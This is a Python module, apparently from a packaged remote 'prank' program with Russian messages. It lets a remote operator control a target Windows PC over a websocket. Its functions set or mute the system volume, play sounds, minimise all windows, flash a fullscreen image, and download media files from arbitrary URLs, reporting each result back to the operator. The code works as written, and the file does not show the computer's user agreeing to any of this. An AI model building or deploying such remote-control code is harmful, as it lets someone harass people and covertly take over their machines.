# Файл: prank_functions.py
import os, sys, time, shutil, pygame, multiprocessing, threading, comtypes, requests, asyncio
from comtypes import CLSCTX_ALL, cast, POINTER
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import settings
from utils import send_status_to_operator

if getattr(sys, 'frozen', False):
    BUNDLE_BASE_PATH = getattr(sys, '_MEIPASS', os.path.abspath("."))
else:
    BUNDLE_BASE_PATH = os.path.dirname(os.path.abspath(__file__))

BUILTIN_AUDIO_PATH = os.path.join(BUNDLE_BASE_PATH, "audio_files")
BUILTIN_IMAGE_PATH = os.path.join(BUNDLE_BASE_PATH, "image_files")
DOWNLOADED_AUDIO_PATH = os.path.join(settings.APP_DATA_PATH, "audio_files")
DOWNLOADED_IMAGE_PATH = os.path.join(settings.APP_DATA_PATH, "image_files")
os.makedirs(DOWNLOADED_AUDIO_PATH, exist_ok=True); os.makedirs(DOWNLOADED_IMAGE_PATH, exist_ok=True)

def _minimize_all_windows():
    try:
        import win32gui, win32con
        shell = win32gui.FindWindow("Shell_TrayWnd", None)
        win32gui.PostMessage(shell, win32con.WM_COMMAND, 419, 0)
    except Exception as e: print(f"[!] Не удалось свернуть окна: {e}")

def _isolated_image_display(image_path):
    _minimize_all_windows(); time.sleep(0.5)
    pygame.init()
    try:
        display_info = pygame.display.Info()
        screen = pygame.display.set_mode((display_info.current_w, display_info.current_h), pygame.NOFRAME)
        image = pygame.transform.scale(pygame.image.load(image_path), (display_info.current_w, display_info.current_h))
        screen.blit(image, (0, 0)); pygame.display.flip()
        start_time = pygame.time.get_ticks()
        while pygame.time.get_ticks() - start_time < 10000:
            for event in pygame.event.get():
                if event.type == pygame.QUIT: return
            pygame.time.wait(30)
    except Exception as e: print(f"[!] Ошибка в процессе показа изображения: {e}")
    finally: pygame.quit()

def get_local_files():
    all_files = {"audio": [], "image": []}
    def collect_from_path(path, file_list):
        if os.path.exists(path):
            for f in os.listdir(path):
                if f not in file_list: file_list.append(f)
    collect_from_path(BUILTIN_AUDIO_PATH, all_files["audio"]); collect_from_path(DOWNLOADED_AUDIO_PATH, all_files["audio"])
    collect_from_path(BUILTIN_IMAGE_PATH, all_files["image"]); collect_from_path(DOWNLOADED_IMAGE_PATH, all_files["image"])
    return all_files

def find_file(filename):
    for path in [DOWNLOADED_AUDIO_PATH, DOWNLOADED_IMAGE_PATH, BUILTIN_AUDIO_PATH, BUILTIN_IMAGE_PATH]:
        filepath = os.path.join(path, filename)
        if os.path.exists(filepath): return filepath
    return None

def get_system_volume():
    volume = None; comtypes.CoInitialize()
    try:
        volume = cast(AudioUtilities.GetSpeakers().Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None), POINTER(IAudioEndpointVolume))
        return round(volume.GetMasterVolumeLevelScalar() * 100)
    except Exception: return 50
    finally:
        if volume: del volume
        comtypes.CoUninitialize()

def set_system_volume(level, ws, loop):
    volume = None; comtypes.CoInitialize()
    try:
        volume = cast(AudioUtilities.GetSpeakers().Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None), POINTER(IAudioEndpointVolume))
        volume.SetMasterVolumeLevelScalar(level / 100.0, None)
        send_status_to_operator(ws, loop, f"🔊 Громкость установлена на {level}%.")
    except Exception as e: send_status_to_operator(ws, loop, f"❌ Ошибка установки громкости: {e}")
    finally:
        if volume: del volume
        comtypes.CoUninitialize()

def toggle_mute(ws, loop):
    volume = None; comtypes.CoInitialize()
    try:
        volume = cast(AudioUtilities.GetSpeakers().Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None), POINTER(IAudioEndpointVolume))
        is_muted = not volume.GetMute(); volume.SetMute(is_muted, None)
        send_status_to_operator(ws, loop, "🔇 Звук выключен." if is_muted else "🔈 Звук включен.")
    except Exception as e: send_status_to_operator(ws, loop, f"❌ Ошибка переключения звука: {e}")
    finally:
        if volume: del volume
        comtypes.CoUninitialize()

def play_local_sound(filename, ws, loop):
    path = find_file(filename)
    if path:
        try:
            pygame.mixer.init(); pygame.mixer.music.load(path); pygame.mixer.music.play()
            send_status_to_operator(ws, loop, f"🎶 Воспроизведение: {filename}")
        except Exception as e: send_status_to_operator(ws, loop, f"❌ Ошибка воспроизведения звука: {e}")
    else: send_status_to_operator(ws, loop, f"❌ Звуковой файл не найден: {filename}")

def show_local_image(filename, ws, loop):
    path = find_file(filename)
    if path:
        image_process = multiprocessing.Process(target=_isolated_image_display, args=(path,), daemon=True)
        image_process.start(); send_status_to_operator(ws, loop, f"🖼 Показ изображения: {filename}")
    else: send_status_to_operator(ws, loop, f"❌ Файл изображения не найден: {filename}")

def download_and_use_file(url, ws, loop):
    send_status_to_operator(ws, loop, f"Загрузка: {url[:50]}...")
    try:
        filename = os.path.basename(url.split('?')[0])
        if not filename: send_status_to_operator(ws, loop, "❌ Не удалось определить имя файла."); return
        audio_ext = ('.mp3', '.wav', '.ogg'); image_ext = ('.jpg', '.jpeg', '.png', '.gif', '.bmp')
        if filename.lower().endswith(audio_ext): save_dir = DOWNLOADED_AUDIO_PATH
        elif filename.lower().endswith(image_ext): save_dir = DOWNLOADED_IMAGE_PATH
        else: send_status_to_operator(ws, loop, "❌ Неподдерживаемый тип файла."); return
        save_path = os.path.join(save_dir, filename)
        response = requests.get(url, stream=True, timeout=30); response.raise_for_status()
        with open(save_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192): f.write(chunk)
        send_status_to_operator(ws, loop, f"✅ Загружен: {filename}")
        new_file_list = get_local_files()
        loop.call_soon_threadsafe(asyncio.create_task, ws.send_json({'type': 'file_list_update', 'data': new_file_list}))
    except Exception as e: send_status_to_operator(ws, loop, f"❌ Ошибка загрузки: {e}")